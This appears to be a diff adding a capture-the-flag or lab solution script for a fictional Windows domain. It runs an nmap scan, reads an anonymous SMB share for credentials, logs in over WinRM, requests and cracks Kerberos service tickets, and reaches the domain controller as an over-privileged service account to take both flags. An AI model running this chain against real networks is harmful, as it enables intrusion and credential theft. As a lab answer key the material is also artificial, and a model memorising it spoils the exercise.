@@ -1,0 +1,21 @@
+## find the domain controller and the file server
+nmap -sn 10.10.9.0/24
+nmap -sV 10.10.9.10
+nmap -sV 10.10.9.20
+## the file server shares a folder with everyone; read it
+smbclient -L //10.10.9.20 -N
+smbclient //10.10.9.20/Share -N -c 'ls; get onboarding.txt'
+cat onboarding.txt
+## sign in as the new user and take the file-server flag
+winrm-shell -i 10.10.9.20 -u jwade -p {{JPW}}
+Get-Content C:\Users\jwade\Desktop\flag.txt
+exit
+## any domain account may ask the domain for service tickets
+ticket-request -d castoak.example -u jwade -p {{JPW}} 10.10.9.10 > tickets.txt
+cat tickets.txt
+## crack the tickets offline: a weak service password falls
+hashcrack tickets.txt
+## svc_sql's password is weak and svc_sql is a Domain Admin; reach the DC
+winrm-shell -i 10.10.9.10 -u svc_sql -p {{SVCPW}}
+Get-Content C:\Users\Administrator\Desktop\flag.txt
+exit
